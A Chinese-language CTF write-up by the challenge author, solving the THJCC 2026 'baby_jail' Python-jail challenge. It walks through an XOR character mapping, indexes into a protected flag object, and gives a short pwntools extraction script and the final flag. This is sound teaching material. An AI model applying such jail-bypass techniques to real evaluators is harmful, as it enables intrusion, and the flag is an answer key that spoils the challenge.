---
title: THJCC 2026 baby_jail wp
date: 2026-02-24 14:36:05
tags: write up
---
## THJCC 2026 baby_jail wp
## 前言
這次這個題目原本預計是出easy難度，但有些東西沒考慮到導致題目變得有點通靈，但還是有靈力強大的玩家在我起床之前把這題秒殺了Orz，所以我也沒辦法進行修改QQ
我下次會注意的，~~絕對不會再把比較關鍵的提示隱藏了~~

## baby_jail
這題連線進去後會發現題目輸出了這段
```
Welcome to baby Jail. Allowed chars: a-z, 0-9, []().
>
```
題目說只能輸入字母數字及中誇號小誇號，而如果像平時常見的 pyjail 題目輸入含_的指令的話則會出現
`Invalid chars. Only a-z, 0-9 and []() allowed.`

而看到題目附給玩家的檔案可以看到 server 的 mapping 邏輯
```
def mapping(k):
    mapping = {}
    for i in range(26):
        plain = chr(ord('a') + i)
        mapped_index = (i ^ k) % 26
        mapped = chr(ord('a') + mapped_index)
        mapping[plain] = mapped
    return mapping
```

就是簡單地把玩家的輸入進行 XOR 而已，而其中的k則是每次連線時隨機變換

```
Welcome to baby Jail. Allowed chars: a-z, 0-9, []().
> abcd
cdab
```
按照上面我們可以知道當把 server 回傳給我們的字串回傳回去我們就可以控制輸出了
```
Welcome to baby Jail. Allowed chars: a-z, 0-9, []().
> flag
hjce
> hjce
flag
```
而這邊可以看到我控制了 server 回傳出 flag 但他並沒有把 flag 吐出來，這是因為我對 flag 做了一點點的保護，不過因為保護的字串就是 flag 所以這邊算是一點小瑕疵
```
class ProtectedFlag:
    def __init__(self, value):
        self._value = value
    def __str__(self):
        return "flag" #之後設計的時候需要注意一下提示的部分
```
那接下來要如何獲取 flag ? 由於沒辦法逃出這個環境所以 flag 其實就寫在 server 中，所以我們利用 python 中 `text[index]` 可以單獨獲取一個字母的原理來取得flag，如下
```
Welcome to baby Jail. Allowed chars: a-z, 0-9, []().
> flag
mcjp
> mcjp[0]
T
> mcjp[1]
H
```
不過一個一個手打有點麻煩，所以寫個簡單的 exp 來完成這件事，因為邏輯很簡單所以希望你們有空的話可以手刻看看w ||這個應該不需要詠唱owob||
簡單的exp:
```
from pwn import *

r = remote("chal.thjcc.org", 15514)

r.recvuntil(b"> ")

flag = ""

for i in range(40):
    r.sendline(b"flag")
    a = r.recvline().decode().strip()
    payload = f"{a}[{i}]"
    r.sendline(payload.encode())
    r.recvuntil(b"> ")
    out = r.recvline().decode().strip()
    flag += out
    r.recvuntil(b"> ")

print(flag)
```
這樣就能獲得flag了
flag:`THJCC{7h3_b4by_j411_15_v3ry_345y_r19h7?}`